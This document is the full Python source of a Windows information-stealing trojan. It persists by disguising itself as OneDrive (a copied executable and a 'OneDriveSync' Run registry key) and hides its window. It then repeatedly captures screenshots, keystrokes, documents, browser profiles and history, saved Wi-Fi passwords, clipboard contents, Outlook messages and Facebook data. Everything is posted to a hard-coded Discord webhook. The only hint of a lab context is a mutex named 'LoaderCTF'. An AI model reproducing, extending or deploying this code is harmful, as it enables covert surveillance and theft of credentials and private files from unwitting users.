import sys, os, tempfile, requests, socket, time, psutil, GPUtil, shutil, zipfile, subprocess
from datetime import datetime, timedelta
import winreg, sqlite3, threading, pyperclip, win32api, win32gui, win32ui
import win32con, win32event, ctypes, json, base64, urllib.request
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import Image

class X:
    W = 'https://discord.com/api/webhooks/1368654180440604692/2MbvCHxPZoLopP6aZGgv6KTZz9rOLaA4RzoWDcapMDDjozm6t_mGbN9dyCBxlRkWn9KD'
    F = 'https://discord.com/api/webhooks/1368654180440604692/2MbvCHxPZoLopP6aZGgv6KTZz9rOLaA4RzoWDcapMDDjozm6t_mGbN9dyCBxlRkWn9KD'
    K = b'ThisIsASecretKey123'
    V = b'ThisIsAnIV4567890'
    I = {'si':30,'sc':30,'fl':30,'bh':30,'wf':30,'cb':30,'pr':30,'nt':30,'sv':30,'ia':30,'kl':30,'mc':30,'wc':30,'em':30,'fb':30}
    D = [os.path.join(os.environ['USERPROFILE'], x) for x in ['Desktop','Documents','Downloads','Pictures','Videos','Music']] + [
        os.path.join(os.environ['APPDATA'], x) for x in [
            'Microsoft\\Windows\\Recent',
            'Microsoft\\Credentials',
            'Mozilla\\Firefox\\Profiles',
            'Google\\Chrome\\User Data',
            'Microsoft\\Edge\\User Data',
            'Opera Software\\Opera Stable',
            'BraveSoftware\\Brave-Browser\\User Data',
            'Vivaldi\\User Data',
            'Discord',
            'Telegram Desktop',
            'Facebook'
        ]
    ]
    E = ['.txt','.doc','.docx','.xls','.xlsx','.pdf','.jpg','.jpeg','.png','.bmp','.gif','.config','.sql','.db',
         '.sqlite','.mdb','.key','.pem','.cer','.crt','.pfx','.zip','.rar','.7z','.tar','.gz','.csv','.pptx','.json']

Y, Z = True, time.time()
L = {k:0 for k in X.I.keys()}

def safe_str(s):
    """Garante que a string seja segura para o webhook do Discord"""
    if s is None:
        return ""
    try:
        # Primeiro converte para string se não for
        s = str(s)
        # Escapa caracteres % e remove quebras de linha problemáticas
        s = s.replace('%', '%%').replace('\r', '').replace('\n', ' | ')
        # Remove caracteres não ASCII
        s = s.encode('ascii', errors='ignore').decode('ascii')
        return s
    except:
        return ""

def G():
    try: return safe_str(urllib.request.urlopen('https://api.ipify.org').read().decode())
    except: return "?"

def SR():
    cf = os.path.abspath(sys.argv[0])
    td = os.path.join(os.getenv('APPDATA'), 'Local', 'OneDrive', 'cache')
    tf = os.path.join(td, os.path.basename(cf))
    if not os.path.abspath(cf).lower() == os.path.abspath(tf).lower():
        try:
            os.makedirs(td, exist_ok=True)
            if os.path.exists(tf): os.remove(tf)
            shutil.copy2(cf, tf)
            AS(tf)
            subprocess.Popen([tf], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE)
            sys.exit(0)
        except: pass

def AS(p=None):
    try:
        k = winreg.HKEY_CURRENT_USER
        r = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(k, r, 0, winreg.KEY_WRITE) as x:
            winreg.SetValueEx(x, "OneDriveSync", 0, winreg.REG_SZ, p or os.path.abspath(sys.argv[0]))
    except: pass

def H():
    k = ctypes.WinDLL('kernel32')
    u = ctypes.WinDLL('user32')
    h = k.GetConsoleWindow()
    if h: u.ShowWindow(h, 0)

def E(d):
    c = AES.new(X.K, AES.MODE_CBC, X.V)
    return base64.b64encode(c.encrypt(pad(d.encode(), AES.block_size))).decode()

def S(u, m, f=None):
    try:
        content = safe_str(m)
        if f and os.path.exists(f):
            with open(f, "rb") as file:
                files = {"file": (os.path.basename(f), file)}
                response = requests.post(u, files=files, data={"content": content}, timeout=30)
        else:
            response = requests.post(u, json={"content": content}, timeout=30)
        return response.status_code == 200
    except Exception as e:
        return False

def CS():
    try:
        h = win32gui.GetDesktopWindow()
        w = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        ht = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        l = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        t = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        dc = win32gui.GetWindowDC(h)
        i = win32ui.CreateDCFromHandle(dc)
        m = i.CreateCompatibleDC()
        s = win32ui.CreateBitmap()
        s.CreateCompatibleBitmap(i,w,ht)
        m.SelectObject(s)
        m.BitBlt((0,0),(w,ht),i,(l,t),win32con.SRCCOPY)
        p = os.path.join(tempfile.gettempdir(),f"s_{int(time.time())}.bmp")
        s.SaveBitmapFile(m,p)
        Image.open(p).save(p.replace('.bmp','.png'))
        os.remove(p)
        m.DeleteDC()
        i.DeleteDC()
        win32gui.ReleaseDC(h,dc)
        win32gui.DeleteObject(s.GetHandle())
        return p.replace('.bmp','.png')
    except: return None

def KH():
    try:
        import keyboard
        keyboard.start_recording()
        time.sleep(10)
        e = keyboard.stop_recording()
        t = ""
        for x in e:
            if x.event_type == keyboard.KEY_DOWN:
                if len(x.name)==1: t+=x.name
                elif x.name=="space": t+=" "
                elif x.name=="enter": t+="\n"
        return t if t else "?"
    except: return None

def CF():
    try:
        t = os.path.join(tempfile.gettempdir(),f"f_{int(time.time())}")
        os.makedirs(t,exist_ok=True)
        c = []
        for d in X.D:
            if os.path.exists(d):
                for r,_,f in os.walk(d):
                    for x in f:
                        if any(x.lower().endswith(e.lower()) for e in X.E):
                            try:
                                s = os.path.join(r,x)
                                ds = os.path.join(t,os.path.relpath(s,d))
                                os.makedirs(os.path.dirname(ds),exist_ok=True)
                                shutil.copy2(s,ds)
                                c.append(ds)
                            except: pass
        if not c:
            shutil.rmtree(t)
            return None
        z = os.path.join(tempfile.gettempdir(),f"f_{int(time.time())}.zip")
        with zipfile.ZipFile(z,'w',zipfile.ZIP_DEFLATED) as zf:
            for x in c: zf.write(x,os.path.relpath(x,t))
        shutil.rmtree(t)
        return z
    except:
        if 't' in locals() and os.path.exists(t): shutil.rmtree(t,ignore_errors=True)
        return None

def BH():
    try:
        h = []
        # Chrome-based browsers
        browsers = [
            ('Google\\Chrome', 'Default'),
            ('Microsoft\\Edge', 'Default'),
            ('BraveSoftware\\Brave-Browser', 'Default'),
            ('Vivaldi', 'Default'),
            ('Opera Software\\Opera Stable', 'Default')
        ]
        
        for browser, profile in browsers:
            cp = os.path.join(os.getenv('LOCALAPPDATA'), browser, 'User Data', profile, 'History')
            if os.path.exists(cp):
                try:
                    t = os.path.join(tempfile.gettempdir(),f'{browser.split("\\")[-1]}_h.db')
                    shutil.copy2(cp,t)
                    conn = sqlite3.connect(t)
                    cur = conn.cursor()
                    cur.execute("SELECT url,title,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                    h.append(f"\n**{browser.split('\\')[-1]}:**")
                    for x in cur.fetchall(): 
                        h.append(f"URL: {safe_str(x[0])}, Title: {safe_str(x[1])}, Last: {datetime(1601,1,1)+timedelta(microseconds=x[2])}")
                    conn.close()
                    os.remove(t)
                except Exception as e: h.append(f"\n{browser.split('\\')[-1]} error: {safe_str(e)}")
        
        # Firefox
        fp = os.path.join(os.getenv('APPDATA'),'Mozilla','Firefox','Profiles')
        if os.path.exists(fp):
            try:
                for p in os.listdir(fp):
                    if p.endswith('.default-release'):
                        pl = os.path.join(fp,p,'places.sqlite')
                        if os.path.exists(pl):
                            t = os.path.join(tempfile.gettempdir(),'f_h.db')
                            shutil.copy2(pl,t)
                            conn = sqlite3.connect(t)
                            cur = conn.cursor()
                            cur.execute("SELECT url,title,last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
                            h.append("\n**Firefox:**")
                            for x in cur.fetchall(): 
                                h.append(f"URL: {safe_str(x[0])}, Title: {safe_str(x[1])}, Last: {datetime.fromtimestamp(x[2]/1000000) if x[2] else 'N/A'}")
                            conn.close()
                            os.remove(t)
            except Exception as e: h.append(f"\nFirefox error: {safe_str(e)}")
        
        return "\n".join(h) if h else "No browsing history found"
    except Exception as e: return f"History error: {safe_str(e)}"

def WP():
    try:
        if sys.platform=="win32":
            p = [x.split(":")[1].strip() for x in subprocess.run(['netsh','wlan','show','profiles'],capture_output=True,text=True,creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\n') if "All User Profile" in x]
            w = []
            for x in p:
                try:
                    k = [x.split(":")[1].strip() for x in subprocess.run(['netsh','wlan','show','profile',x,'key=clear'],capture_output=True,text=True,creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\n') if "Key Content" in x]
                    w.append(f"SSID: {safe_str(x)}, Pass: {safe_str(k[0]) if k else 'N/A'}")
                except: w.append(f"SSID: {safe_str(x)}, Pass: ?")
            return "\n".join(w)
        else: return "Windows only"
    except Exception as e: return f"WiFi error: {safe_str(e)}"

def GC():
    try: return safe_str(pyperclip.paste())
    except Exception as e: return f"Clipboard error: {safe_str(e)}"

def IA():
    try:
        if sys.platform=="win32":
            a = []
            for r in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
                try:
                    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r)
                    for i in range(0,winreg.QueryInfoKey(k)[0]):
                        try:
                            sk = winreg.OpenKey(k,winreg.EnumKey(k,i))
                            n = winreg.QueryValueEx(sk,"DisplayName")[0]
                            v = winreg.QueryValueEx(sk,"DisplayVersion")[0]
                            a.append(f"{safe_str(n)} (v{safe_str(v)})")
                        except: continue
                except: continue
            return "\n".join(a[:100])
        else: return "Windows only"
    except Exception as e: return f"Installed apps error: {safe_str(e)}"

def RP():
    try:
        p = []
        for x in psutil.process_iter(['pid','name','username']):
            try: p.append(f"PID: {x.info['pid']}, Name: {safe_str(x.info['name'])}, User: {safe_str(x.info['username'])}")
            except: continue
        return "\n".join(p[:100])
    except Exception as e: return f"Processes error: {safe_str(e)}"

def NC():
    try:
        c = []
        for x in psutil.net_connections(kind='inet'):
            if x.status == psutil.CONN_ESTABLISHED:
                c.append(f"Local: {x.laddr.ip}:{x.laddr.port}, Remote: {x.raddr.ip if x.raddr else 'N/A'}:{x.raddr.port if x.raddr else 'N/A'}, PID: {x.pid}")
        return "\n".join(c[:100])
    except Exception as e: return f"Network connections error: {safe_str(e)}"

def RS():
    try:
        s = []
        for x in psutil.win_service_iter():
            try: s.append(f"Name: {safe_str(x.name())}, Display: {safe_str(x.display_name())}, Status: {safe_str(x.status())}")
            except: continue
        return "\n".join(s[:100])
    except Exception as e: return f"Services error: {safe_str(e)}"

def SI():
    try:
        hn = socket.gethostname()
        try: ip = socket.gethostbyname(hn)
        except: ip = "?"
        ut = str(timedelta(seconds=time.time()-Z))
        mt = str(timedelta(seconds=time.time()-psutil.boot_time()))
        ei = G()
        g = ""
        try:
            for x in GPUtil.getGPUs():
                g += (f"\n- GPU: {safe_str(x.name)}, Load: {x.load*100:.1f}%, "
                    f"Mem: {x.memoryUsed:.1f}/{x.memoryTotal:.1f} MB, "
                    f"Temp: {x.temperature}°C")
        except: g = "\n- GPU: ?"
        
        sys_info = (
            f"**System:**\n- Host: {safe_str(hn)}\n- IP: {safe_str(ip)}\n- Ext IP: {safe_str(ei)}\n"
            f"- Uptime: {safe_str(ut)}\n- Sys uptime: {safe_str(mt)}\n- CPU: {os.cpu_count()} cores\n"
            f"- Mem: {round(psutil.virtual_memory().total/(1024**3),1)} GB{g}"
        )
        return sys_info
    except Exception as e: 
        return f"System info error: {safe_str(e)}"

def SU():
    try:
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        gu, gt = "N/A", "N/A"
        
        try:
            gpus = GPUtil.getGPUs()
            if gpus:
                gu = f"{gpus[0].load*100:.1f}%"
                gt = f"{gpus[0].temperature}°C"
        except:
            pass
        
        # Construção segura da mensagem
        parts = [
            f"**Usage:**",
            f"- CPU: {safe_str(cpu)}%",
            f"- Mem: {safe_str(mem.percent)}% ({safe_str(round(mem.used/1024**3,1))}/{safe_str(round(mem.total/1024**3,1))} GB)",
            f"- Disk: {safe_str(disk.percent)}% ({safe_str(round(disk.used/1024**3,1))}/{safe_str(round(disk.total/1024**3,1))} GB)",
            f"- GPU: {safe_str(gu)}",
            f"- Temp: {safe_str(gt)}"
        ]
        
        return '\n'.join(parts)
    except Exception as e:
        return f"System usage: {safe_str(e)}"

def EM():
    try:
        import win32com.client
        outlook = win32com.client.Dispatch("Outlook.Application")
        mapi = outlook.GetNamespace("MAPI")
        msgs = []
        for i in range(1, min(6, len(mapi.Folders))):
            folder = mapi.Folders[i]
            for item in folder.Items:
                if item.Class == 43:
                    msgs.append(f"From: {safe_str(item.SenderName)}, Subject: {safe_str(item.Subject)}")
                    if len(msgs) >= 20: break
            if len(msgs) >= 20: break
        return "\n".join(msgs) if msgs else "No emails found"
    except Exception as e: return f"Email error: {safe_str(e)}"

def FB():
    try:
        fb_path = os.path.join(os.getenv('APPDATA'), 'Facebook')
        if os.path.exists(fb_path):
            temp_fb = os.path.join(tempfile.gettempdir(), 'fb_data.zip')
            with zipfile.ZipFile(temp_fb, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(fb_path):
                    for file in files:
                        if file.endswith(('.json', '.db', '.sqlite')):
                            try:
                                zf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), fb_path))
                            except: continue
            return temp_fb
        return None
    except Exception as e: return f"FB error: {safe_str(e)}"

def main_loop():
    global L, Y
    while Y:
        t = time.time()
        try:
            if t-L['si']>=X.I['si']:
                if S(X.W,SI()): L['si']=t
                S(X.W,SU())
            if t-L['sc']>=X.I['sc']:
                s = CS()
                if s:
                    S(X.W,"Screenshot:",s)
                    os.remove(s)
                    L['sc']=t
            if t-L['kl']>=X.I['kl']:
                k = KH()
                if k: S(X.W,f"Keys:\n{E(k)}"); L['kl']=t
            if t-L['fl']>=X.I['fl']:
                f = CF()
                if f:
                    S(X.F,"Files:",f)
                    os.remove(f)
                    L['fl']=t
            if t-L['bh']>=X.I['bh']:
                S(X.W,f"History:\n{BH()}"); L['bh']=t
            if t-L['wf']>=X.I['wf']:
                S(X.W,f"WiFi:\n{WP()}"); L['wf']=t
            if t-L['cb']>=X.I['cb']:
                S(X.W,f"Clipboard:\n{GC()}"); L['cb']=t
            if t-L['pr']>=X.I['pr']:
                S(X.W,f"Processes:\n{RP()}"); L['pr']=t
            if t-L['nt']>=X.I['nt']:
                S(X.W,f"Network:\n{NC()}"); L['nt']=t
            if t-L['sv']>=X.I['sv']:
                S(X.W,f"Services:\n{RS()}"); L['sv']=t
            if t-L['ia']>=X.I['ia']:
                S(X.W,f"Apps:\n{IA()}"); L['ia']=t
            if t-L['em']>=X.I['em']:
                S(X.W,f"Emails:\n{EM()}"); L['em']=t
            if t-L['fb']>=X.I['fb']:
                fb = FB()
                if fb:
                    S(X.F,"FB Data:",fb)
                    os.remove(fb)
                    L['fb']=t
            time.sleep(30)
        except: time.sleep(60)

def main():
    SR()
    H()
    m = win32event.CreateMutex(None,False,"Global\\LoaderCTF")
    if win32api.GetLastError()==183: sys.exit(0)
    main_loop()

if __name__=='__main__': 
    main()